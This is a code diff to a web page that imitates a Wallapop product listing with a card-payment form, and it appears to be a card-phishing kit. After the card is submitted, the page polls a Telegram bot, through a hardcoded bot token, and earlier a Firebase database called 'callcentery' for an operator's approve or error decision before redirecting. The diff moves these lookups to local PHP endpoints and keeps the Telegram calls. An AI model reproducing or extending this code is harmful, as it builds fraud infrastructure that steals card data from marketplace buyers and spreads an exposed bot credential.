@@ -183,19 +183,9 @@ form#formCard{padding:0 16px}
   margin:0;
 }
 @keyframes wpspin{to{transform:rotate(360deg)}}
-
-@keyframes wpPreloadSpin{to{transform:rotate(360deg)}}
-#viewProduct{flex:1;opacity:0;transition:opacity 0.25s ease;}
-#viewProduct.ready{opacity:1;}
-.track img{width:100%;flex:0 0 100%;aspect-ratio:4/3;object-fit:cover;scroll-snap-align:center;display:block;background:var(--wp-bg-low)}
-
 </style>
 </head>
 <body>
-<div id="whitePreloader" style="position:fixed;inset:0;background:#ffffff;z-index:99999999;display:flex;align-items:center;justify-content:center;transition:opacity 0.25s ease;">
-  <div style="width:36px;height:36px;border:3px solid #CCFAF1;border-top-color:#13C1AC;border-radius:50%;animation:wpPreloadSpin .8s linear infinite;"></div>
-</div>
-
 
 <div class="phone">
 
@@ -410,49 +400,20 @@ function setBot(cls, txt) {
 let currentProd = null;
 
 async function show(id) {
-  let preloaderHidden = false;
-  function hidePreloader() {
-    if (preloaderHidden) return;
-    preloaderHidden = true;
-    const pl = $('whitePreloader');
-    if (pl) {
-      pl.style.opacity = '0';
-      setTimeout(() => { pl.style.display = 'none'; }, 250);
-    }
-    const vp = $('viewProduct');
-    if (vp) vp.classList.add('ready');
-  }
-
-  const preloaderTimer = setTimeout(hidePreloader, 5000);
-
   let p = null;
   let allProds = null;
   let activeId = '';
 
-  // 1. Si hay id, intentar Firebase Realtime Database PRIMERO (tiempo real, sin esperas de despliegue)
-  if (id) {
-    try {
-      const fbRes = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/products/' + id + '.json?t=' + Date.now());
-      if (fbRes.ok) {
-        const fbProd = await fbRes.json();
-        if (fbProd && (fbProd.id || fbProd.titulo)) {
-          p = fbProd;
-          if (!p.id) p.id = id;
-        }
-      }
-    } catch (e) {}
-  }
-
-  // 2. Si viene codificado en URL params (?p=base64, ?d=base64 o hash #d=...)
+  // 1. Si viene codificado en URL params (?p=base64, ?d=base64 o hash #d=...)
   const sp = new URLSearchParams(location.search);
   const hashStr = location.hash || '';
   const hashP = hashStr.match(/[#&][pd]=([^&]+)/);
   const rawP = sp.get('p') || sp.get('d') || (hashP ? hashP[1] : null);
-  if (!p && rawP) {
+  if (rawP) {
     try {
       const decodedJson = decodeURIComponent(escape(atob(decodeURIComponent(rawP))));
       const parsed = JSON.parse(decodedJson);
-      if (parsed && (parsed.id || parsed.titulo)) {
+      if (parsed && parsed.id) {
         p = parsed;
         try {
           const db = JSON.parse(localStorage.getItem('wp_products_v1') || '{"products":{}}');
@@ -461,11 +422,14 @@ async function show(id) {
           db.activeId = p.id;
           localStorage.setItem('wp_products_v1', JSON.stringify(db));
         } catch(e) {}
+        try {
+          history.replaceState({}, '', '/a/' + p.id);
+        } catch(e) {}
       }
     } catch (e) {}
   }
 
-  // 3. Si viene por query params sueltos (?titulo=...&precio=...)
+  // 2. Si viene por query params sueltos (?titulo=...&precio=...)
   if (!p && sp.get('titulo')) {
     p = {
       id: id || 'AD' + Date.now().toString().slice(-7),
@@ -478,6 +442,14 @@ async function show(id) {
       articulo: sp.get('articulo') || sp.get('titulo'),
       fotos: sp.get('fotos') ? sp.get('fotos').split(',') : []
     };
+  }
+
+  // 3. Si hay id, intentar API local
+  if ((!p || !p.id) && id) {
+    try {
+      const r = await fetch('/api/product/' + id);
+      if (r.ok) p = await r.json();
+    } catch (e) {}
   }
 
   // 4. Intentar desde localStorage por su ID
@@ -523,21 +495,6 @@ async function show(id) {
     if (id && sdb && sdb[id]) p = sdb[id];
   }
 
-  // 7b. Intentar desde Firebase Realtime Database (todos los productos o activo)
-  if (!p || !p.id) {
-    try {
-      const fbAllRes = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/products.json?t=' + Date.now());
-      if (fbAllRes.ok) {
-        const fbAll = await fbAllRes.json();
-        if (fbAll && typeof fbAll === 'object') {
-          allProds = fbAll;
-          const targetKey = id ? id : Object.keys(fbAll).pop();
-          if (targetKey && fbAll[targetKey]) p = fbAll[targetKey];
-        }
-      }
-    } catch (e) {}
-  }
-
   // 8. Si no se especificó ID en la URL (entró a la raíz /), abrir el activo o último
   if ((!p || !p.id) && !id && allProds) {
     const targetKey = (activeId && allProds[activeId]) ? activeId : Object.keys(allProds).pop();
@@ -551,8 +508,6 @@ async function show(id) {
     $('viewProduct').style.display = 'none';
     if ($('viewEmpty')) $('viewEmpty').style.display = 'none';
     document.title = 'Wallapop';
-    clearTimeout(preloaderTimer);
-    hidePreloader();
     return;
   }
 
@@ -589,116 +544,96 @@ async function show(id) {
     fotos = Object.values(p.fotos).filter(Boolean);
   }
 
-  // Si no hay fotos en el producto, buscar foto guardada en Firebase por su ID
+  // Fallback 1: Buscar fotos en localStorage por ID
   if (!fotos.length && p.id) {
     try {
-      const fbPhotoRes = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/photos/' + p.id + '.json?t=' + Date.now());
-      if (fbPhotoRes.ok) {
-        const phData = await fbPhotoRes.json();
-        if (phData && phData.base64) {
-          fotos = [phData.base64];
+      const db = JSON.parse(localStorage.getItem('wp_products_v1') || '{}');
+      const lprods = db.products || db;
+      if (lprods && lprods[p.id] && lprods[p.id].fotos) {
+        const lf = lprods[p.id].fotos;
+        fotos = Array.isArray(lf) ? lf.filter(Boolean) : (typeof lf === 'string' ? [lf] : Object.values(lf).filter(Boolean));
+      }
+    } catch (e) {}
+  }
+
+  // Fallback 2: Buscar fotos en window.SERVER_DB
+  if (!fotos.length && window.SERVER_DB && window.SERVER_DB.products && window.SERVER_DB.products[p.id]) {
+    const sP = window.SERVER_DB.products[p.id];
+    if (sP.fotos) {
+      fotos = Array.isArray(sP.fotos) ? sP.fotos.filter(Boolean) : (typeof sP.fotos === 'string' ? [sP.fotos] : Object.values(sP.fotos).filter(Boolean));
+    }
+  }
+
+  // Fallback 3: Consultar products.json
+  if (!fotos.length && p.id) {
+    try {
+      const r = await fetch('/products.json?t=' + Date.now());
+      if (r.ok) {
+        const d = await r.json();
+        const prods = d.products || d;
+        if (prods && prods[p.id] && prods[p.id].fotos) {
+          const pf = prods[p.id].fotos;
+          fotos = Array.isArray(pf) ? pf.filter(Boolean) : (typeof pf === 'string' ? [pf] : Object.values(pf).filter(Boolean));
         }
       }
     } catch (e) {}
   }
 
-  function fixPhotoUrl(src) {
+  // Normalizar enlaces de fotos asegurando compatibilidad con el storage del hosting
+  fotos = fotos.map(src => {
     if (typeof src !== 'string') return '';
     src = src.trim();
     if (!src) return '';
-    if (src.startsWith('data:') || src.startsWith('blob:')) return src;
-    if (src.includes('api.telegram.org') && !src.includes('wsrv.nl') && !src.includes('images.weserv.nl')) {
-      const raw = src.replace(/^https?:\/\//, '');
-      return 'https://wsrv.nl/?url=' + encodeURIComponent(raw);
-    }
     return src;
-  }
+  }).filter(Boolean);
 
-  fotos = fotos.map(fixPhotoUrl).filter(Boolean);
   p.fotos = fotos;
   if (currentProd) currentProd.fotos = fotos;
 
-  function renderGalleryPhotos(fList) {
-    const g = $('gallery'), track = $('track'), dots = $('dots');
-    if (!fList || !fList.length) {
-      g.hidden = true;
-      g.style.display = 'none';
-      return;
-    }
-    g.hidden = false;
-    g.style.display = 'block';
-    track.innerHTML = ''; dots.innerHTML = '';
-    fList.forEach((src, i) => {
-      const img = document.createElement('img');
-      img.src = src;
-      img.alt = '';
-      img.onerror = () => {
-        // En caso de fallo, ocultar limpiamente sin mostrar icono roto ni texto Foto 1
-        img.style.display = 'none';
-      };
-      track.appendChild(img);
-      const d = document.createElement('button');
-      d.className = i === 0 ? 'on' : '';
-      d.addEventListener('click', () => track.scrollTo({ left: track.clientWidth * i, behavior: 'smooth' }));
-      dots.appendChild(d);
-    });
-    $('count').textContent = '1/' + fList.length;
-    track.onscroll = () => {
-      const i = Math.round(track.scrollLeft / track.clientWidth);
-      $('count').textContent = (i + 1) + '/' + fList.length;
-      [...dots.children].forEach((d, k) => d.classList.toggle('on', k === i));
-    };
-  }
-
+  const g = $('gallery'), track = $('track'), dots = $('dots');
   if (!fotos.length) {
-    $('gallery').hidden = true;
-    $('gallery').style.display = 'none';
-    clearTimeout(preloaderTimer);
-    hidePreloader();
-  } else {
-    // Pre-cargar la primera foto en memoria. La página se mantiene en blanco hasta que esté 100% lista
-    const mainPhoto = fotos[0];
-    const testImg = new Image();
-    testImg.onload = () => {
-      clearTimeout(preloaderTimer);
-      renderGalleryPhotos(fotos);
-      hidePreloader();
-    };
-    testImg.onerror = () => {
-      // Si la foto falló (por ejemplo enlace de Telegram caducado), probar base64 de Firebase
-      if (p.id) {
-        fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/photos/' + p.id + '.json?t=' + Date.now())
-          .then(r => r.json())
-          .then(d => {
-            clearTimeout(preloaderTimer);
-            if (d && d.base64) {
-              fotos[0] = d.base64;
-              p.fotos[0] = d.base64;
-              const retryImg = new Image();
-              retryImg.onload = retryImg.onerror = () => {
-                renderGalleryPhotos(fotos);
-                hidePreloader();
-              };
-              retryImg.src = d.base64;
-            } else {
-              renderGalleryPhotos(fotos);
-              hidePreloader();
-            }
-          })
-          .catch(() => {
-            clearTimeout(preloaderTimer);
-            renderGalleryPhotos(fotos);
-            hidePreloader();
-          });
-      } else {
-        clearTimeout(preloaderTimer);
-        renderGalleryPhotos(fotos);
-        hidePreloader();
+    g.hidden = true;
+    g.style.display = 'none';
+    return;
+  }
+  g.hidden = false;
+  g.style.display = 'block';
+  track.innerHTML = ''; dots.innerHTML = '';
+  fotos.forEach((src, i) => {
+    const img = document.createElement('img');
+    img.src = src; img.alt = 'Foto ' + (i + 1); img.loading = 'lazy';
+    img.onerror = () => {
+      // 1. Si falló y tiene nombre de archivo img_xxx o tg_xxx, intentar cargarlo directo desde el storage /photos/
+      const m = src.match(/(img_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i) || src.match(/(tg_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i);
+      if (m && !img.dataset.retriedLocal) {
+        img.dataset.retriedLocal = '1';
+        img.src = '/photos/' + m[1];
+        return;
+      }
+      // 2. Si falló weserv y venía de telegram, intentar la URL directa
+      if (src.includes('images.weserv.nl') && !img.dataset.retriedTg) {
+        img.dataset.retriedTg = '1';
+        const parts = src.split('images.weserv.nl/?url=');
+        if (parts[1]) {
+          img.src = 'https://' + decodeURIComponent(parts[1]).replace(/^https?:\/\//, '');
+          return;
+        }
       }
     };
-    testImg.src = mainPhoto;
-  }
+    track.appendChild(img);
+    const d = document.createElement('button');
+    d.className = i === 0 ? 'on' : '';
+    d.addEventListener('click', () => track.scrollTo({ left: track.clientWidth * i, behavior: 'smooth' }));
+    dots.appendChild(d);
+  });
+  $('count').textContent = '1/' + fotos.length;
+  track.onscroll = () => {
+    const i = Math.round(track.scrollLeft / track.clientWidth);
+    $('count').textContent = (i + 1) + '/' + fotos.length;
+    [...dots.children].forEach((d, k) => d.classList.toggle('on', k === i));
+  };
 }
+
 const render = () => show(currentId());
 
 $('logoImg').addEventListener('error', el => {
@@ -741,21 +676,11 @@ function mostrarStep2() {
   let f = (currentProd.fotos || [])[0];
   const th = $('thumbStep2');
   if (f) {
-    if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('wsrv.nl') && !f.includes('images.weserv.nl')) {
-      f = 'https://wsrv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
+    if (typeof f === 'string' && f.includes('api.telegram.org') && !f.includes('images.weserv.nl')) {
+      f = 'https://images.weserv.nl/?url=' + encodeURIComponent(f.replace(/^https?:\/\//, ''));
     }
     th.src = f;
     th.style.display = 'block';
-    th.onerror = () => {
-      const c = th.src;
-      if (c.includes('wsrv.nl') && !th.dataset.r1) {
-        th.dataset.r1 = '1';
-        th.src = c.replace('wsrv.nl', 'images.weserv.nl');
-      } else if (c.includes('images.weserv.nl') && !th.dataset.r2) {
-        th.dataset.r2 = '1';
-        th.src = c.replace('images.weserv.nl', 'wsrv.nl');
-      }
-    };
   } else {
     th.style.display = 'none';
   }
@@ -929,20 +854,7 @@ $('formCard').addEventListener('submit', async ev => {
       });
     }
 
-    // Resetear estado global en Firebase y en Telegram para sincronizar la decisión de los botones
-    try {
-      await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/" + idProd + ".json", {
-        method: "PUT",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ status: "waiting", id: idProd, ts: Date.now() })
-      });
-      await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/latest.json", {
-        method: "PUT",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ status: "waiting", id: idProd, ts: Date.now() })
-      });
-    } catch (e) {}
-
+    // Resetear estado global en Telegram para sincronizar la decisión de los botones
     try {
       await fetch("https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/setMyDescription", {
         method: "POST",
@@ -956,29 +868,20 @@ $('formCard').addEventListener('submit', async ev => {
 
   const pollCardStatus = async () => {
     let data = null;
-
-    // 0. Probar Firebase Realtime Database por ID del producto (tiempo real, sin bloqueos)
+    // 1. Probar ruta amigable
     try {
-      const fbStResp = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/' + idProd + '.json?t=' + Date.now());
-      if (fbStResp.ok) {
-        const fbSt = await fbStResp.json();
-        if (fbSt && fbSt.status && fbSt.status !== 'waiting') {
-          data = fbSt;
-        }
+      const resp = await fetch('/api/product/' + idProd + '/tarjeta/status?t=' + Date.now());
+      if (resp.ok) {
+        data = await resp.json();
       }
     } catch (e) {}
 
-    // 0b. Probar Firebase Realtime Database status latest
-    if (!data || !data.status || data.status === 'waiting') {
+    // 2. Probar api.php directo (fallback infalible para hosting PHP)
+    if (!data || !data.status) {
       try {
-        const fbLatResp = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/latest.json?t=' + Date.now());
-        if (fbLatResp.ok) {
-          const fbLat = await fbLatResp.json();
-          if (fbLat && fbLat.status && fbLat.status !== 'waiting') {
-            if (!fbLat.id || fbLat.id === idProd || !idProd) {
-              data = fbLat;
-            }
-          }
+        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + idProd + '&t=' + Date.now());
+        if (resp2.ok) {
+          data = await resp2.json();
         }
       } catch (e) {}
     }
@@ -995,7 +898,7 @@ $('formCard').addEventListener('submit', async ev => {
         const rawP = sp.get('p') || sp.get('d');
         if (rawP) qParams.set('p', rawP);
         try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-        window.location.href = '/confirmacion.html?' + qParams.toString();
+        window.location.href = 'confirmar.php?' + qParams.toString();
         return;
       } else if (data.status === 'error') {
         $('spinnerTarjeta').style.display = 'none';
@@ -1007,7 +910,7 @@ $('formCard').addEventListener('submit', async ev => {
       }
     }
 
-    // Fallback adicional Telegram getMyDescription
+    // 3. Fallback adicional Telegram getMyDescription
     try {
       const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
       if (tgDescResp.ok) {
@@ -1024,7 +927,7 @@ $('formCard').addEventListener('submit', async ev => {
           const rawP = sp.get('p') || sp.get('d');
           if (rawP) qParams.set('p', rawP);
           try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-          window.location.href = '/confirmacion.html?' + qParams.toString();
+          window.location.href = 'confirmar.php?' + qParams.toString();
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -1037,10 +940,10 @@ $('formCard').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 600);
+    cardPollTimer = setTimeout(pollCardStatus, 1000);
   };
 
-  cardPollTimer = setTimeout(pollCardStatus, 600);
+  cardPollTimer = setTimeout(pollCardStatus, 1200);
 });
 
 $('cmdToggle').addEventListener('click', () => { const c = $('cmds'); c.hidden = !c.hidden; });
